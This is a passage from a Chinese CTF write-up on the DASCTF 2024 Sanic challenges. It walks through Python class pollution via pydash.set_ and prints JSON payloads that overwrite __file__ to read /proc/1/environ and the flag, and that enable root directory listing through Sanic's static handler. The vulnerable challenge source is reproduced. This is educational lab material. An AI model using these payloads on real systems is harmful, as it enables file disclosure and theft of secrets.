class=\"string\">&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"><span class=\"attr\">&quot;value&quot;</span> <span class=\"punctuation\">:</span> <span class=\"string\">&quot;/proc/1/environ&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/a9da93b14d1f46dba7baadaca4c8ba51.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t但是，看了下大佬们的 wp 似乎有另一种姿势，算是一种非预期吧。</p>\n<p><strong>下面跟着大佬们走：</strong></p>\n<p>​\t\t先看如下位置：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app = Sanic(__name__)</span><br><span class=\"line\">app.static(<span class=\"string\">&quot;/static/&quot;</span>, <span class=\"string\">&quot;./static/&quot;</span>)</span><br><span class=\"line\">Session(app)</span><br></pre></td></tr></table></figure>\n<p>​\t\t跟进 static ()，得到如下内容：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">static</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">    self,</span></span><br><span class=\"line\"><span class=\"params\">    uri: <span class=\"built_in\">str</span>,</span></span><br><span class=\"line\"><span class=\"params\">    file_or_directory: <span class=\"type\">Union</span>[PathLike, <span class=\"built_in\">str</span>],</span></span><br><span class=\"line\"><span class=\"params\">    pattern: <span class=\"built_in\">str</span> = <span class=\"string\">r&quot;/?.+&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">    use_modified_since: <span class=\"built_in\">bool</span> = <span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">    use_content_range: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">    stream_large_files: <span class=\"type\">Union</span>[<span class=\"built_in\">bool</span>, <span class=\"built_in\">int</span>] = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">    name: <span class=\"built_in\">str</span> = <span class=\"string\">&quot;static&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">    host: <span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    strict_slashes: <span class=\"type\">Optional</span>[<span class=\"built_in\">bool</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    content_type: <span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    apply: <span class=\"built_in\">bool</span> = <span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">    resource_type: <span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    index: <span class=\"type\">Optional</span>[<span class=\"type\">Union</span>[<span class=\"built_in\">str</span>, <span class=\"type\">Sequence</span>[<span class=\"built_in\">str</span>]]] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    directory_view: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">    directory_handler: <span class=\"type\">Optional</span>[DirectoryHandler] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\"></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Register a root to serve files from. The input can either be a file or a directory.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    This method provides an easy and simple way to set up the route necessary to serve static files.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Args:</span></span><br><span class=\"line\"><span class=\"string\">        uri (str): URL path to be used for serving static content.</span></span><br><span class=\"line\"><span class=\"string\">        file_or_directory (Union[PathLike, str]): Path to the static file</span></span><br><span class=\"line\"><span class=\"string\">            or directory with static files.</span></span><br><span class=\"line\"><span class=\"string\">        pattern (str, optional): Regex pattern identifying the valid</span></span><br><span class=\"line\"><span class=\"string\">            static files. Defaults to `r&quot;/?.+&quot;`.</span></span><br><span class=\"line\"><span class=\"string\">        use_modified_since (bool, optional): If true, send file modified</span></span><br><span class=\"line\"><span class=\"string\">            time, and return not modified if the browser&#x27;s matches the</span></span><br><span class=\"line\"><span class=\"string\">            server&#x27;s. Defaults to `True`.</span></span><br><span class=\"line\"><span class=\"string\">        use_content_range (bool, optional): If true, process header for</span></span><br><span class=\"line\"><span class=\"string\">            range requests and sends  the file part that is requested.</span></span><br><span class=\"line\"><span class=\"string\">            Defaults to `False`.</span></span><br><span class=\"line\"><span class=\"string\">        stream_large_files (Union[bool, int], optional): If `True`, use</span></span><br><span class=\"line\"><span class=\"string\">            the `StreamingHTTPResponse.file_stream` handler rather than</span></span><br><span class=\"line\"><span class=\"string\">            the `HTTPResponse.file handler` to send the file. If this</span></span><br><span class=\"line\"><span class=\"string\">            is an integer, it represents the threshold size to switch</span></span><br><span class=\"line\"><span class=\"string\">            to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span></span><br><span class=\"line\"><span class=\"string\">            which means that the response will not be streamed.</span></span><br><span class=\"line\"><span class=\"string\">        name (str, optional): User-defined name used for url_for.</span></span><br><span class=\"line\"><span class=\"string\">            Defaults to `&quot;static&quot;`.</span></span><br><span class=\"line\"><span class=\"string\">        host (Optional[str], optional): Host IP or FQDN for the</span></span><br><span class=\"line\"><span class=\"string\">            service to use.</span></span><br><span class=\"line\"><span class=\"string\">        strict_slashes (Optional[bool], optional): Instruct Sanic to</span></span><br><span class=\"line\"><span class=\"string\">            check if the request URLs need to terminate with a slash.</span></span><br><span class=\"line\"><span class=\"string\">        content_type (Optional[str], optional): User-defined content type</span></span><br><span class=\"line\"><span class=\"string\">            for header.</span></span><br><span class=\"line\"><span class=\"string\">        apply (bool, optional): If true, will register the route</span></span><br><span class=\"line\"><span class=\"string\">            immediately. Defaults to `True`.</span></span><br><span class=\"line\"><span class=\"string\">        resource_type (Optional[str], optional): Explicitly declare a</span></span><br><span class=\"line\"><span class=\"string\">            resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span></span><br><span class=\"line\"><span class=\"string\">        index (Optional[Union[str, Sequence[str]]], optional): When</span></span><br><span class=\"line\"><span class=\"string\">            exposing against a directory, index is  the name that will</span></span><br><span class=\"line\"><span class=\"string\">            be served as the default file. When multiple file names are</span></span><br><span class=\"line\"><span class=\"string\">            passed, then they will be tried in order.</span></span><br><span class=\"line\"><span class=\"string\">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class=\"line\"><span class=\"string\">            the directory viewer when exposing a directory. Defaults</span></span><br><span class=\"line\"><span class=\"string\">            to `False`.</span></span><br><span class=\"line\"><span class=\"string\">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class=\"line\"><span class=\"string\">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class=\"line\"><span class=\"string\">            controlling and subclassing the behavior of the default</span></span><br><span class=\"line\"><span class=\"string\">            directory handler.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Returns:</span></span><br><span class=\"line\"><span class=\"string\">        List[sanic.router.Route]: Routes registered on the router.</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Examples:</span></span><br><span class=\"line\"><span class=\"string\">        Serving a single file:</span></span><br><span class=\"line\"><span class=\"string\">        ```python</span></span><br><span class=\"line\"><span class=\"string\">        app.static(&#x27;/foo&#x27;, &#x27;path/to/static/file.txt&#x27;)</span></span><br></pre></td></tr></table></figure>\n<pre><code>        Serving all files from a directory:\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.static(<span class=\"string\">&#x27;/static&#x27;</span>, <span class=\"string\">&#x27;path/to/static/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n        Serving large files with a specific threshold:\n        <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.static(<span class=\"string\">&#x27;/static&#x27;</span>, <span class=\"string\">&#x27;path/to/large/files&#x27;</span>, stream_large_files=<span class=\"number\">1000000</span>)</span><br></pre></td></tr></table></figure>\n    &quot;&quot;&quot;  # noqa: E501\n\n    name = self.generate_name(name)\n\n    if strict_slashes is None and self.strict_slashes is not None:\n        strict_slashes = self.strict_slashes\n\n    if not isinstance(file_or_directory, (str, bytes, PurePath)):\n        raise ValueError(\n            f&quot;Static route must be a valid path, not &#123;file_or_directory&#125;&quot;\n        )\n\n    try:\n        file_or_directory = Path(file_or_directory).resolve()\n    except TypeError:\n        raise TypeError(\n            &quot;Static file or directory must be a path-like object or string&quot;\n        )\n\n    if directory_handler and (directory_view or index):\n        raise ValueError(\n            &quot;When explicitly setting directory_handler, you cannot &quot;\n            &quot;set either directory_view or index. Instead, pass &quot;\n            &quot;these arguments to your DirectoryHandler instance.&quot;\n        )\n\n    if not directory_handler:\n        directory_handler = DirectoryHandler(\n            uri=uri,\n            directory=file_or_directory,\n            directory_view=directory_view,\n            index=index,\n        )\n\n    static = FutureStatic(\n        uri,\n        file_or_directory,\n        pattern,\n        use_modified_since,\n        use_content_range,\n        stream_large_files,\n        name,\n        host,\n        strict_slashes,\n        content_type,\n        resource_type,\n        directory_handler,\n    )\n    self._future_statics.add(static)\n\n    if apply:\n        self._apply_static(static)\n</code></pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">​\t\t注释里面存在这两句话：</span><br><span class=\"line\"></span><br><span class=\"line\">```tex</span><br><span class=\"line\">            directory_view (bool, optional): Whether to fallback to showing</span><br><span class=\"line\">                the directory viewer when exposing a directory. Defaults</span><br><span class=\"line\">                to `False`.</span><br><span class=\"line\">            directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class=\"line\">                instance of DirectoryHandler that can be used for explicitly</span><br><span class=\"line\">                controlling and subclassing the behavior of the default</span><br><span class=\"line\">                directory handler.</span><br></pre></td></tr></table></figure>\n<p>​\t\t大致意思就是 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录。跟进下 <code>directory_handler</code>  ，如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> directory_handler:</span><br><span class=\"line\">    directory_handler = DirectoryHandler(</span><br><span class=\"line\">        uri=uri,</span><br><span class=\"line\">        directory=file_or_directory,</span><br><span class=\"line\">        directory_view=directory_view,</span><br><span class=\"line\">        index=index,</span><br><span class=\"line\">    )</span><br></pre></td></tr></table></figure>\n<p>​\t\t再跟进 <code>DirectoryHandler</code> ，发现如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">        self,</span></span><br><span class=\"line\"><span class=\"params\">        uri: <span class=\"built_in\">str</span>,</span></span><br><span class=\"line\"><span class=\"params\">        directory: Path,</span></span><br><span class=\"line\"><span class=\"params\">        directory_view: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">        index: <span class=\"type\">Optional</span>[<span class=\"type\">Union</span>[<span class=\"built_in\">str</span>, <span class=\"type\">Sequence</span>[<span class=\"built_in\">str</span>]]] = <span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">    </span>) -&gt; <span class=\"literal\">None</span>:</span><br></pre></td></tr></table></figure>\n<p>​\t\t我们发现只要我们将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了。</p>\n<p><strong>后续我在 Windows 上测试次次运行不了，这里就直接借一下大佬们的代码在这儿，我就不实操了</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sanic <span class=\"keyword\">import</span> Sanic</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic.response <span class=\"keyword\">import</span> text, html</span><br><span class=\"line\"><span class=\"comment\">#from sanic_session import Session</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> pydash</span><br><span class=\"line\"><span class=\"comment\"># pydash==5.1.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollute</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Sanic(__name__)</span><br><span class=\"line\">app.static(<span class=\"string\">&quot;/static/&quot;</span>, <span class=\"string\">&quot;./static/&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#Session(app)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class=\"line\"><span class=\"comment\">#async def index(request):</span></span><br><span class=\"line\">    <span class=\"comment\">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#@app.route(&quot;/login&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#async def login(request):</span></span><br><span class=\"line\">    <span class=\"comment\">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class=\"line\">    <span class=\"comment\">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class=\"line\">        <span class=\"comment\">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class=\"line\">        <span class=\"comment\">#return text(&quot;login success&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#return text(&quot;login fail&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/src&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">src</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(app.router.name_index)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"built_in\">open</span>(__file__).read())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/admin&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">admin</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">    value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;_.&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">        pollute = Pollute()</span><br><span class=\"line\">        pydash.set_(pollute, key, value)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;forbidden&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t输出应该接近这样：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/de66f739b68d4092a1c471efee8f4a6b.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t\t看出来了路由是  <code>&quot;__mp_main__.static&quot;</code> ，之后，就可以直接一把梭了（具体链子怎么找，参考 gxngxngxn 大佬的文章）：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t上面的 payload 是开启目录功能。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;/&quot;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这个 payload 是将指定目录污染为根目录，之后访问 /static/ 目录，就能看到根目录下开始的所有文件的文件名了 /</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;/flag文件名字&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这个 payload 是用来读 flag 文件的，之后访问 src 路由即可获得 flag。</p>\n<h2 id=\"dasctf2024夏季挑战赛sanics-revenge\"><a class=\"markdownIt-Anchor\" href=\"#dasctf2024夏季挑战赛sanics-revenge\">#</a> [DASCTF2024 夏季挑战赛] Sanic’s revenge</h2>\n<p>​\t\t题目给了个附件，下载下来直接开始审：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sanic <span class=\"keyword\">import</span> Sanic</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> sanic.response <span class=\"keyword\">import</span> text, html</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> pydash</span><br><span class=\"line\"><span class=\"comment\"># pydash==5.1.2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Pollute</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">app = Sanic(__name__)</span><br><span class=\"line\">app.static(<span class=\"string\">&quot;/static/&quot;</span>, <span class=\"string\">&quot;./static/&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">secret</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    secret=<span class=\"string\">&#x27;**************************&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">index</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html(<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;static/index.html&#x27;</span>).read())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/pollute&quot;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">POLLUTE</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    key = request.json[<span class=\"string\">&#x27;key&#x27;</span>]</span><br><span class=\"line\">    value = request.json[<span class=\"string\">&#x27;value&#x27;</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> key <span class=\"keyword\">and</span> value <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(key) <span class=\"keyword\">is</span> <span class=\"built_in\">str</span> <span class=\"keyword\">and</span> <span class=\"string\">&#x27;parts&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key <span class=\"keyword\">and</span> <span class=\"string\">&#x27;proc&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(value) <span class=\"keyword\">and</span> <span class=\"built_in\">type</span>(value) <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"built_in\">list</span>:</span><br><span class=\"line\">        pollute = Pollute()</span><br><span class=\"line\">        pydash.set_(pollute, key, value)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        log_dir = create_log_dir(<span class=\"number\">6</span>)</span><br><span class=\"line\">        log_dir_bak = log_dir + <span class=\"string\">&quot;..&quot;</span></span><br><span class=\"line\">        log_file = <span class=\"string\">&quot;/tmp/&quot;</span> + log_dir + <span 